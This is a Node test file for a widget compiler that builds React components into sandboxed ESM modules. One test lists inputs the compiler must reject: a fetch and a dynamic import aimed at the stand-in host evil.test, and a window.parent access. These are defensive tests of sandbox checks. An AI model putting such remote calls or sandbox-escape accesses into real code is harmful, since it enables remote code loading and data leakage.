import assert from 'node:assert/strict';
import { test } from 'node:test';
import { compileWidget } from './compile.js';

test('compiles React component to a default-export ESM module with shared globals', async () => {
  const result = await compileWidget(`import React from 'react';
    import { Button } from '@grasp/primitives/ui';
    export default function Widget() { return <Button>OK</Button>; }`);
  assert.equal(result.ok, true);
  if (result.ok) {
    assert.match(result.code, /export\s*\{[^}]*default/);
    assert.match(result.code, /__GRASP_DEPS__/);
    assert.doesNotMatch(result.code, /from ['"]react['"]/);
  }
});

test('rejects forbidden APIs and imports before browser launch', async () => {
  for (const source of ['export default () => fetch("https://evil.test")',
    'import x from "lodash"; export default () => x',
    'export default () => import("https://evil.test")',
    'export default () => window.parent']) {
    const result = await compileWidget(source);
    assert.equal(result.ok, false);
    if (!result.ok) assert.ok(result.errors.length);
  }
});

test('syntax errors include a source line', async () => {
  const result = await compileWidget('export default () => <div>');
  assert.equal(result.ok, false);
  if (!result.ok) assert.match(result.errors[0], /compile:.*line 1/);
});

test('rejects a module without default export', async () => {
  const result = await compileWidget('export const foo = 1');
  assert.deepEqual(result, { ok: false, errors: ['compile: widget must have a default export'] });
});
